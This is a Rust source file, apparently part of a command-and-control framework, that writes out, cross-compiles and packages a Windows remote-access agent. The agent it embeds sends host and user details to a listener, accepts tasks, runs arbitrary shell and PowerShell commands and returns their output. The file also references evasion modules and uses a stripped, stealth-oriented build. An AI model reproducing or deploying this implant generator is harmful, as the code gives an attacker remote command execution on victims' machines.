// src/agent/mod.rs - FIXED: GUI-compatible agent generator that creates actual .exe files
use std::io;
use std::path::Path;
use std::fs::{File, create_dir_all, remove_dir_all};
use std::io::Write;
use std::process::Command;
use serde::{Serialize, Deserialize};

// Sub-modules for evasion techniques
pub mod evasion;
pub mod syscalls;
pub mod polymorphic;
pub mod environment;

use evasion::EvasionConfig;

#[derive(Clone)]
pub struct AgentGenerator;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentConfig {
    pub listener_url: String,
    pub format: String,
    pub architecture: String,
    pub sleep_time: u32,
    pub jitter: u8,
    pub injection: String,
    pub output_path: String,
    pub evasion_enabled: bool,
    pub stealth_level: StealthLevel,
}

impl Default for AgentConfig {
    fn default() -> Self {
        Self {
            listener_url: "http://127.0.0.1:8080".to_string(),
            format: "exe".to_string(),
            architecture: "x64".to_string(),
            sleep_time: 60,
            jitter: 10,
            injection: "self".to_string(),
            output_path: "agent.exe".to_string(),
            evasion_enabled: false,
            stealth_level: StealthLevel::Basic,
        }
    }
}

#[derive(Debug, Clone, Serialize, Deserialize, PartialEq)]
pub enum StealthLevel {
    Basic,      // Simple obfuscation
    Advanced,   // Syscalls + sleep masking
    Maximum,    // Full evasion suite
}

impl AgentGenerator {
    pub fn new() -> Self {
        AgentGenerator
    }
    
    // MAIN FIX: Generate actual executable files through GUI
    pub fn generate(&self, config: AgentConfig) -> io::Result<()> {
        println!("🎯 GUI Agent Generator: Starting compilation for {}", config.output_path);
        
        // Ensure output directory exists
        if let Some(parent) = Path::new(&config.output_path).parent() {
            create_dir_all(parent)?;
        }
        
        // Always attempt to create actual executable
        if config.format == "exe" {
            println!("🔨 Compiling Windows executable via GUI");
            
            // Try multiple compilation strategies
            if let Ok(_) = self.try_windows_cross_compile(&config) {
                println!("✅ Windows .exe successfully created: {}", config.output_path);
                return Ok(());
            }
            
            if let Ok(_) = self.try_native_compile_with_rename(&config) {
                println!("✅ Native executable created and renamed: {}", config.output_path);
                return Ok(());
            }
            
            println!("⚠️ Direct compilation failed, creating immediate buildable project");
        }
        
        // Create a project that can be built immediately
        self.create_immediate_build_project(&config)
    }
    
    // FIXED: Windows cross-compilation optimized for GUI
    fn try_windows_cross_compile(&self, config: &AgentConfig) -> io::Result<()> {
        let temp_dir = format!("/tmp/gui_agent_build_{}", std::process::id());
        
        // Clean up any existing temp directory
        let _ = remove_dir_all(&temp_dir);
        
        println!("📁 Creating build workspace: {}", temp_dir);
        self.create_complete_agent_project(&temp_dir, config)?;
        
        // Install Windows target silently
        let _ = Command::new("rustup")
            .args(&["target", "add", "x86_64-pc-windows-gnu"])
            .output();
        
        println!("🔨 Cross-compiling for Windows...");
        let output = Command::new("cargo")
            .args(&[
                "build",
                "--release",
                "--target", "x86_64-pc-windows-gnu",
                "--quiet"
            ])
            .current_dir(&temp_dir)
            .output()?;
        
        if output.status.success() {
            let exe_source = format!("{}/target/x86_64-pc-windows-gnu/release/agent.exe", temp_dir);
            if Path::new(&exe_source).exists() {
                std::fs::copy(&exe_source, &config.output_path)?;
                let _ = remove_dir_all(&temp_dir);
                return Ok(());
            }
        }
        
        Err(io::Error::new(io::ErrorKind::Other, "Windows cross-compilation failed"))
    }
    
    // FIXED: Native compilation with .exe rename
    fn try_native_compile_with_rename(&self, config: &AgentConfig) -> io::Result<()> {
        let temp_dir = format!("/tmp/gui_native_build_{}", std::process::id());
        
        // Clean up any existing temp directory
        let _ = remove_dir_all(&temp_dir);
        
        println!("📁 Creating native build workspace: {}", temp_dir);
        self.create_complete_agent_project(&temp_dir, config)?;
        
        println!("🔨 Native compilation...");
        let output = Command::new("cargo")
            .args(&["build", "--release", "--quiet"])
            .current_dir(&temp_dir)
            .output()?;
        
        if output.status.success() {
            // Try multiple possible binary locations
            let possible_binaries = vec![
                format!("{}/target/release/agent", temp_dir),
                format!("{}/target/release/agent.exe", temp_dir),
            ];
            
            for binary_path in possible_binaries {
                if Path::new(&binary_path).exists() {
                    std::fs::copy(&binary_path, &config.output_path)?;
                    self.make_executable(&config.output_path)?;
                    let _ = remove_dir_all(&temp_dir);
                    return Ok(());
                }
            }
        }
        
        Err(io::Error::new(io::ErrorKind::Other, "Native compilation failed"))
    }
    
    // FIXED: Create immediate build project with build script
    fn create_immediate_build_project(&self, config: &AgentConfig) -> io::Result<()> {
        let project_name = Path::new(&config.output_path)
            .file_stem()
            .and_then(|s| s.to_str())
            .unwrap_or("agent");
            
        let project_dir = format!("{}_project", config.output_path.trim_end_matches(".exe"));
        
        println!("📁 Creating immediate build project: {}", project_dir);
        self.create_complete_agent_project(&project_dir, config)?;
        
        // Create auto-build script
        let build_script = format!(r#"#!/bin/bash
echo "🚀 Auto-building agent executable..."

# Try Windows cross-compilation first
if rustup target add x86_64-pc-windows-gnu && cargo build --release --target x86_64-pc-windows-gnu; then
    echo "✅ Windows .exe created!"
    cp target/x86_64-pc-windows-gnu/release/agent.exe ../{}
elif cargo build --release; then
    echo "✅ Native binary created!"
    if [ -f target/release/agent.exe ]; then
        cp target/release/agent.exe ../{}
    elif [ -f target/release/agent ]; then
        cp target/release/agent ../{}
        chmod +x ../{}
    fi
else
    echo "❌ Build failed"
    exit 1
fi

echo "🎯 Executable ready at: {}"
"#, 
            Path::new(&config.output_path).file_name().unwrap().to_str().unwrap(),
            Path::new(&config.output_path).file_name().unwrap().to_str().unwrap(),
            Path::new(&config.output_path).file_name().unwrap().to_str().unwrap(),
            Path::new(&config.output_path).file_name().unwrap().to_str().unwrap(),
            config.output_path
        );
        
        let mut build_file = File::create(format!("{}/build.sh", project_dir))?;
        build_file.write_all(build_script.as_bytes())?;
        
        // Make build script executable
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mut perms = std::fs::metadata(format!("{}/build.sh", project_dir))?.permissions();
            perms.set_mode(0o755);
            std::fs::set_permissions(format!("{}/build.sh", project_dir), perms)?;
        }
        
        // Try to build immediately
        println!("🔨 Attempting immediate build...");
        let build_output = Command::new("bash")
            .arg("build.sh")
            .current_dir(&project_dir)
            .output();
            
        match build_output {
            Ok(output) if output.status.success() => {
                println!("✅ Immediate build successful!");
                let _ = remove_dir_all(&project_dir);
                return Ok(());
            },
            _ => {
                println!("⚠️ Immediate build failed, project preserved for manual build");
            }
        }
        
        // Create GUI instructions
        let instructions = format!(r#"# Agent Build Instructions

## Generated Agent Project: {}

### Quick Build:
```bash
cd {}
./build.sh
```

### Manual Build:
```bash
cd {}
cargo build --release --target x86_64-pc-windows-gnu
# Or for native: cargo build --release
```

### Configuration:
- Listener: {}
- Sleep: {}s ({}% jitter)
- Format: {} ({})
- Output: {}

### Status:
✅ Project created successfully
⚠️ Auto-build failed - manual build required
📁 Build script provided: ./build.sh

### Next Steps:
1. Open terminal in project directory
2. Run: ./build.sh
3. Executable will be created at: {}
"#, 
            project_name,
            project_dir, project_dir,
            config.listener_url, config.sleep_time, config.jitter,
            config.format.to_uppercase(), config.architecture,
            config.output_path, config.output_path
        );
        
        let mut instructions_file = File::create(format!("{}/README.md", project_dir))?;
        instructions_file.write_all(instructions.as_bytes())?;
        
        println!("📋 Build instructions: {}/README.md", project_dir);
        println!("🔨 Manual build: cd {} && ./build.sh", project_dir);
        
        Ok(())
    }
    
    // FIXED: Create complete working agent project
    fn create_complete_agent_project(&self, project_dir: &str, config: &AgentConfig) -> io::Result<()> {
        create_dir_all(format!("{}/src", project_dir))?;
        
        // Generate optimized Cargo.toml
        let cargo_toml = format!(r#"[package]
name = "agent"
version = "0.1.0"
edition = "2021"

[[bin]]
name = "agent"
path = "src/main.rs"

[dependencies]
tokio = {{ version = "1.28", features = ["full"] }}
reqwest = {{ version = "0.11", features = ["json", "rustls-tls"], default-features = false }}
serde = {{ version = "1.0", features = ["derive"] }}
serde_json = "1.0"
rand = "0.8"

[profile.release]
strip = true
lto = true
codegen-units = 1
panic = "abort"
opt-level = "z"
debug = false
"#);
        
        let mut cargo_file = File::create(format!("{}/Cargo.toml", project_dir))?;
        cargo_file.write_all(cargo_toml.as_bytes())?;
        
        // Generate complete working agent source
        let agent_source = self.generate_complete_agent_source(config);
        let mut main_file = File::create(format!("{}/src/main.rs", project_dir))?;
        main_file.write_all(agent_source.as_bytes())?;
        
        Ok(())
    }
    
    // FIXED: Generate complete, working agent source code
    fn generate_complete_agent_source(&self, config: &AgentConfig) -> String {
        format!(r#"// C2 Agent - Generated by GUI
use std::time::Duration;
use tokio;
use serde::{{Serialize, Deserialize}};

const LISTENER_URL: &str = "{}";
const SLEEP_TIME: u64 = {};
const JITTER: u8 = {};

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct BeaconData {{
    pub id: String,
    pub hostname: String,
    pub username: String,
    pub os: String,
    pub arch: String,
    pub ip: String,
    pub pid: u32,
    pub current_directory: Option<String>,
}}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct AgentTask {{
    pub id: String,
    pub command: String,
    pub task_type: TaskType,
    pub created_at: u64,
}}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub enum TaskType {{
    Shell,
    PowerShell,
    Cd,
    Kill,
    Sleep,
    Upload,
    Download,
}}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct TaskResult {{
    pub id: String,
    pub command: String,
    pub result: String,
    pub success: bool,
    pub execution_time_ms: u64,
    pub current_directory: Option<String>,
    pub error_details: Option<String>,
}}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {{
    let agent_id = format!("AGENT-{{:08X}}", rand::random::<u32>());
    let mut current_directory = get_current_directory();
    let mut failures = 0;
    const MAX_FAILURES: usize = 5;
    
    loop {{
        let beacon_data = BeaconData {{
            id: agent_id.clone(),
            hostname: get_hostname(),
            username: get_username(),
            os: get_os_info(),
            arch: "{}".to_string(),
            ip: "127.0.0.1".to_string(),
            pid: std::process::id(),
            current_directory: Some(current_directory.clone()),
        }};
        
        match send_beacon(&beacon_data).await {{
            Ok(tasks) => {{
                failures = 0;
                for task in tasks {{
                    let result = execute_task(&task, &mut current_directory).await;
                    let _ = send_task_result(&result).await;
                }}
            }},
            Err(_) => {{
                failures += 1;
                if failures >= MAX_FAILURES {{
                    break;
                }}
            }}
        }}
        
        let sleep_duration = calculate_sleep_with_jitter(SLEEP_TIME, JITTER);
        tokio::time::sleep(Duration::from_secs(sleep_duration)).await;
    }}
    
    Ok(())
}}

async fn send_beacon(beacon_data: &BeaconData) -> Result<Vec<AgentTask>, Box<dyn std::error::Error>> {{
    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(30))
        .build()?;
    
    let response = client
        .post(&format!("{{}}/beacon", LISTENER_URL))
        .json(beacon_data)
        .send()
        .await?;
    
    if response.status().is_success() {{
        let tasks: Vec<AgentTask> = response.json().await.unwrap_or_default();
        Ok(tasks)
    }} else {{
        Err("Beacon failed".into())
    }}
}}

async fn execute_task(task: &AgentTask, current_directory: &mut String) -> TaskResult {{
    let start_time = std::time::Instant::now();
    
    let (result, success, new_directory) = match task.task_type {{
        TaskType::Shell => execute_shell_command(&task.command, current_directory),
        TaskType::PowerShell => execute_powershell_command(&task.command),
        TaskType::Cd => change_directory(&task.command, current_directory),
        TaskType::Kill => {{
            std::process::exit(0);
        }},
        TaskType::Sleep => {{
            if let Ok(seconds) = task.command.parse::<u64>() {{
                tokio::time::sleep(Duration::from_secs(seconds)).await;
                (format!("Slept {{}} seconds", seconds), true, None)
            }} else {{
                ("Invalid sleep time".to_string(), false, None)
            }}
        }},
        _ => ("Not implemented".to_string(), false, None),
    }};
    
    if let Some(new_dir) = new_directory {{
        *current_directory = new_dir;
    }}
    
    TaskResult {{
        id: task.id.clone(),
        command: task.command.clone(),
        result,
        success,
        execution_time_ms: start_time.elapsed().as_millis() as u64,
        current_directory: Some(current_directory.clone()),
        error_details: None,
    }}
}}

async fn send_task_result(result: &TaskResult) -> Result<(), Box<dyn std::error::Error>> {{
    let client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(30))
        .build()?;
    
    let _ = client
        .post(&format!("{{}}/task_result", LISTENER_URL))
        .json(result)
        .send()
        .await?;
    
    Ok(())
}}

fn execute_shell_command(command: &str, current_directory: &str) -> (String, bool, Option<String>) {{
    let mut cmd = if cfg!(target_os = "windows") {{
        let mut c = std::process::Command::new("cmd");
        c.args(&["/C", command]);
        c
    }} else {{
        let mut c = std::process::Command::new("sh");
        c.args(&["-c", command]);
        c
    }};
    
    cmd.current_dir(current_directory);
    
    match cmd.output() {{
        Ok(output) => {{
            let stdout = String::from_utf8_lossy(&output.stdout);
            let stderr = String::from_utf8_lossy(&output.stderr);
            let combined = if stderr.is_empty() {{
                stdout.to_string()
            }} else {{
                format!("{{}}\\n{{}}", stdout, stderr)
            }};
            (combined, output.status.success(), None)
        }},
        Err(e) => (format!("Command failed: {{}}", e), false, None),
    }}
}}

fn execute_powershell_command(command: &str) -> (String, bool, Option<String>) {{
    if cfg!(target_os = "windows") {{
        match std::process::Command::new("powershell")
            .args(&["-Command", command])
            .output() {{
            Ok(output) => {{
                let stdout = String::from_utf8_lossy(&output.stdout);
                let stderr = String::from_utf8_lossy(&output.stderr);
                let combined = if stderr.is_empty() {{
                    stdout.to_string()
                }} else {{
                    format!("{{}}\\n{{}}", stdout, stderr)
                }};
                (combined, output.status.success(), None)
            }},
            Err(e) => (format!("PowerShell failed: {{}}", e), false, None),
        }}
    }} else {{
        ("PowerShell not available".to_string(), false, None)
    }}
}}

fn change_directory(path: &str, current_directory: &str) -> (String, bool, Option<String>) {{
    let new_path = path.trim().strip_prefix("cd ").unwrap_or(path.trim());
    
    let target_path = if std::path::Path::new(new_path).is_absolute() {{
        new_path.to_string()
    }} else {{
        std::path::Path::new(current_directory)
            .join(new_path)
            .to_string_lossy()
            .to_string()
    }};
    
    if std::path::Path::new(&target_path).exists() {{
        (format!("Changed to: {{}}", target_path), true, Some(target_path))
    }} else {{
        (format!("Directory not found: {{}}", target_path), false, None)
    }}
}}

fn get_hostname() -> String {{
    std::env::var("COMPUTERNAME")
        .or_else(|_| std::env::var("HOSTNAME"))
        .unwrap_or_else(|_| "unknown".to_string())
}}

fn get_username() -> String {{
    std::env::var("USERNAME")
        .or_else(|_| std::env::var("USER"))
        .unwrap_or_else(|_| "unknown".to_string())
}}

fn get_os_info() -> String {{
    if cfg!(target_os = "windows") {{
        "Windows".to_string()
    }} else if cfg!(target_os = "linux") {{
        "Linux".to_string()
    }} else {{
        "Unknown".to_string()
    }}
}}

fn get_current_directory() -> String {{
    std::env::current_dir()
        .map(|p| p.to_string_lossy().to_string())
        .unwrap_or_else(|_| if cfg!(target_os = "windows") {{
            "C:\\\\".to_string()
        }} else {{
            "/".to_string()
        }})
}}

fn calculate_sleep_with_jitter(base_sleep: u64, jitter_percent: u8) -> u64 {{
    let jitter_range = (base_sleep * jitter_percent as u64) / 100;
    let min_sleep = base_sleep.saturating_sub(jitter_range);
    let max_sleep = base_sleep + jitter_range;
    rand::random::<u64>() % (max_sleep - min_sleep + 1) + min_sleep
}}
"#, config.listener_url, config.sleep_time, config.jitter, config.architecture)
    }
    
    fn make_executable(&self, path: &str) -> io::Result<()> {
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mut perms = std::fs::metadata(path)?.permissions();
            perms.set_mode(0o755);
            std::fs::set_permissions(path, perms)?;
        }
        Ok(())
    }
}